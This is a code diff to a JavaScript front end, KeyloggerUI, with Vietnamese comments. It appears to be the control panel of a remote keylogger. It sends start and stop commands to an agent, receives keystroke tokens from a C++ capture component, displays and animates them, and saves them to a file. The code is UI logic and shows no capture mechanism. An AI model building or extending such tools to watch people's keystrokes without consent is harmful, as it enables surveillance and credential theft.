@@ -30,9 +30,8 @@ class KeyloggerUI {
             this.originalOnKeylog = window.gateway.callbacks?.onKeylog;
             
             // Override onKeylog callback để xử lý visual effects
-            // Vẫn gọi callback gốc để main.js có thể update display
             window.gateway.callbacks.onKeylog = (data, senderId) => {
-                // Gọi handler gốc để update display (từ main.js)
+                // Gọi handler gốc để update display (nếu main.js cần)
                 if (this.originalOnKeylog) {
                     this.originalOnKeylog(data, senderId);
                 }
@@ -40,13 +39,11 @@ class KeyloggerUI {
                 this.handleIncomingKey(data, senderId);
             };
 
-        // 2. Gán sự kiện cho các nút
-        this.btnMenu.addEventListener('click', () => {
-            window.location.href = 'Feature_menu.html';
-        });
-        this.btnStart.onclick = () => this.startKeylog();
-        this.btnStop.onclick = () => this.stopKeylog();
-        this.btnSave.onclick = () => this.saveToDevice();
+            // 2. Gán sự kiện cho các nút
+            if (this.btnMenu) this.btnMenu.addEventListener('click', () => { window.location.href = 'Feature_menu.html'; });
+            if (this.btnStart) this.btnStart.onclick = () => this.startKeylog();
+            if (this.btnStop) this.btnStop.onclick = () => this.stopKeylog();
+            if (this.btnSave) this.btnSave.onclick = () => this.saveToDevice();
 
             // 3. Inject CSS để phục vụ việc "nháy đèn" phím khi nhận tín hiệu
             this.injectActiveStyle();
@@ -70,23 +67,18 @@ class KeyloggerUI {
         }
 
         if (!window.gateway.isAuthenticated) {
-            // Tự động Auth nếu chưa đăng nhập
             Logic.authenticate();
-            // Đợi một chút để auth hoàn tất
-            setTimeout(() => {
-                this.startKeylog();
-            }, 500);
+            setTimeout(() => this.startKeylog(), 500);
             return;
         }
 
         this.isLogging = true;
         
-        // Gửi lệnh Start Keylog tới Server/Agent
-        // interval: 0.1 để nhận dữ liệu gần như realtime cho hiệu ứng mượt
-        Logic.startKeylog(0.1);
+        // Gửi lệnh Start Keylog. Interval 0.5s để buffer mảng cho đỡ lag network
+        Logic.startKeylog(0.5);
         
         if (this.btnStart) {
-            this.btnStart.style.backgroundColor = "#22c55e"; // Green signals active
+            this.btnStart.style.backgroundColor = "#22c55e"; 
             this.btnStart.innerText = "Monitoring...";
         }
     }
@@ -95,11 +87,10 @@ class KeyloggerUI {
         if (!window.gateway) return;
 
         this.isLogging = false;
-        
         Logic.stopKeylog();
         
         if (this.btnStart) {
-            this.btnStart.style.backgroundColor = ""; // Reset color
+            this.btnStart.style.backgroundColor = ""; 
             this.btnStart.innerText = "Start keylog";
         }
     }
@@ -107,89 +98,150 @@ class KeyloggerUI {
     // --- Core Logic: Xử lý dữ liệu nhận về ---
 
     /**
-     * Xử lý luồng data nhận được từ Socket
-     * @param {string} dataString - Chuỗi ký tự nhận được (có thể là 1 hoặc nhiều ký tự)
+     * Xử lý luồng data nhận được từ Socket (Bây giờ hỗ trợ Array)
+     * @param {string|string[]} data - Mảng các phím hoặc chuỗi ký tự
      */
-    handleIncomingKey(dataString, senderId) {
+    handleIncomingKey(data, senderId) {
         if (!this.isLogging) return;
 
-        // Xử lý dữ liệu qua logic.js
-        const processed = Logic.processKeylogData(dataString, senderId);
-        if (!processed.processed) return;
+        // --- TRƯỜNG HỢP 1: Dữ liệu là Mảng (Vector<string> từ C++) ---
+        if (Array.isArray(data)) {
+            data.forEach(keyToken => {
+                // Chuẩn hóa token từ C++ (VD: "[ENTER]" -> "\n")
+                const normalizedChar = this.normalizeKey(keyToken);
+                
+                // 1. Lưu buffer
+                this.logBuffer += normalizedChar;
+                
+                // 2. Hiển thị text
+                this.updateDisplay(normalizedChar);
+                
+                // 3. Hiệu ứng Visual
+                this.visualizeKey(keyToken, normalizedChar); 
+            });
+            return;
+        }
 
-        // Xử lý UI cho từng ký tự
-        processed.chars.forEach(char => {
-            // 1. Lưu vào buffer (để tải file)
-            this.logBuffer += char;
+        // --- TRƯỜNG HỢP 2: Dữ liệu là String (Backup logic cũ) ---
+        // Vẫn giữ lại Logic.processKeylogData nếu backend gửi dạng cũ hoặc message hệ thống
+        const processed = Logic.processKeylogData(data, senderId);
+        if (processed.processed && processed.chars) {
+            processed.chars.forEach(char => {
+                this.logBuffer += char;
+                this.updateDisplay(char);
+                this.visualizeKey(char, char);
+            });
+        }
+    }
 
-            // 2. Hiển thị lên thanh Input màu xám
-            this.updateDisplay(char);
-
-            // 3. Hiệu ứng Visual trên bàn phím ảo
-            this.visualizeKey(char);
-        });
+    /**
+     * Chuyển đổi các tag đặc biệt từ C++ sang ký tự hiển thị
+     */
+    normalizeKey(token) {
+        // Mapping các tag từ file KeyboardController.cpp
+        switch (token) {
+            case "[ENTER]": 
+            case "\n": return "\n"; // Xuống dòng
+            
+            case "[TAB]": return "\t";
+            
+            case "[BACK]": return "Backspace"; // Dùng từ khóa này để hàm updateDisplay xử lý xóa
+            
+            case "[SPACE]": 
+            case " ": return " ";
+            
+            case "[ESC]": return ""; // Không in gì cả
+            case "[CTRL]": return ""; 
+            
+            default:
+                // Nếu là format "[123]" (Unknown key code), bỏ qua hoặc in ra nguyên văn
+                if (token.startsWith("[") && token.endsWith("]") && token.length > 1) {
+                    return ""; // Ẩn các phím hệ thống lạ
+                }
+                return token; // Trả về ký tự thường (a, b, c, 1, 2...)
+        }
     }
 
     updateDisplay(char) {
         if (!this.displayInput) return;
 
-        // Giả lập hành vi nhập liệu cơ bản
-        if (char === '\b' || char === 'Backspace') {
+        // Xử lý xóa ký tự
+        if (char === 'Backspace') {
             this.displayInput.value = this.displayInput.value.slice(0, -1);
-        } else if (char === '\n' || char === 'Enter') {
-            // Input type text không hiển thị xuống dòng, ta có thể thay bằng ký hiệu
-            // hoặc giữ nguyên nếu muốn save file đúng định dạng.
-            // Ở đây ta hiển thị ký hiệu để người dùng biết đã xuống dòng.
-            this.displayInput.value += "↵ "; 
-        } else if (char.length === 1) {
+        } 
+        // Xử lý xuống dòng
+        else if (char === '\n') {
+            this.displayInput.value += "↵\n"; // Thêm ký tự xuống dòng thực sự
+        } 
+        // Xử lý ký tự thường (chỉ in nếu không rỗng)
+        else if (char && char.length === 1) {
             this.displayInput.value += char;
         }
         
-        // Auto scroll input sang phải cùng
-        this.displayInput.scrollLeft = this.displayInput.scrollWidth;
+        // Auto scroll
+        this.displayInput.scrollTop = this.displayInput.scrollHeight;
     }
 
-    visualizeKey(char) {
+    /**
+     * Tìm phím trên bàn phím ảo và nháy đèn
+     * @param {string} rawToken - Token gốc từ C++ (VD: "[ENTER]")
+     * @param {string} displayChar - Ký tự hiển thị (VD: "\n")
+     */
+    visualizeKey(rawToken, displayChar) {
         let targetKey = null;
-        const lowerChar = char.toLowerCase();
-
-        // Mapping ký tự đặc biệt sang Text hiển thị trên bàn phím HTML
-        const specialMap = {
+        
+        // Chuẩn hóa để so sánh với data-key hoặc text trong HTML
+        let searchKey = rawToken.toLowerCase().replace(/[\[\]]/g, ""); // [ENTER] -> enter
+        
+        // Mapping bổ sung cho khớp với UI HTML
+        const uiMap = {
             '\n': 'enter',
-            '\r': 'enter',
-            ' ': 'space', // Space trong HTML là div rỗng, ta xử lý riêng bên dưới
-            '\t': 'tab',
-            '\b': 'backspace',
-            'backspace': 'backspace'
+            'back': 'backspace',
+            'esc': 'escape',
+            'ctrl': 'control',
+            ' ': 'space',
+            '\t': 'tab'
         };
+
+        if (uiMap[searchKey]) searchKey = uiMap[searchKey];
+        if (displayChar === ' ') searchKey = 'space'; // Fix cứng cho Space
 
         // Tìm phím trên DOM
         for (let key of this.keys) {
+            // Lấy text hiển thị trên phím hoặc class đặc biệt
             let keyText = key.innerText.toLowerCase().trim();
             
-            // Xử lý phím Space (trong HTML là div rỗng class k-6-25)
-            if (char === ' ' && keyText === '' && key.classList.contains('k-6-25')) {
-                targetKey = key;
-                break;
-            }
+            // Logic tìm kiếm
+            let isMatch = false;
 
-            // Xử lý các phím ký tự thường và phím chức năng
-            if (keyText === lowerChar || keyText === specialMap[lowerChar]) {
+            // 1. So sánh với text trên phím (VD: "a", "enter")
+            if (keyText === searchKey) isMatch = true;
+            
+            // 2. So sánh đặc biệt cho Space (thường là phím rỗng dài nhất)
+            else if (searchKey === 'space' && key.classList.contains('k-6-25')) isMatch = true;
+            
+            // 3. So sánh các phím mũi tên hoặc ký hiệu nếu cần
+            
+            if (isMatch) {
                 targetKey = key;
                 break;
             }
         }
 
-        // Nếu tìm thấy phím, kích hoạt hiệu ứng
+        // Kích hoạt hiệu ứng
         if (targetKey) {
+            // Reset animation cũ nếu đang chạy
+            targetKey.classList.remove('active-simulation');
+            void targetKey.offsetWidth; // Trigger reflow
+
             targetKey.classList.add('active-simulation');
             setTimeout(() => {
                 targetKey.classList.remove('active-simulation');
-            }, 150); // Nháy trong 150ms
+            }, 200);
         }
     }
 
-    // --- File Operations ---
+    // --- File Operations (Giữ nguyên) ---
 
     saveToDevice() {
         if (!this.logBuffer) {
@@ -222,7 +274,6 @@ class KeyloggerUI {
 
     logSystem(msg) {
         console.log(`[KeylogUI] ${msg}`);
-        // Có thể hiển thị thông báo lên UI nếu cần
     }
 
     injectActiveStyle() {
@@ -231,9 +282,10 @@ class KeyloggerUI {
             .key.active-simulation {
                 background-color: #E57D36 !important;
                 color: #fff !important;
-                transform: translateY(3px);
-                box-shadow: none !important;
+                transform: translateY(2px);
+                box-shadow: 0 0 10px rgba(229, 125, 54, 0.5) !important;
                 transition: all 0.05s ease;
+                border-color: #E57D36 !important;
             }
         `;
         document.head.appendChild(style);
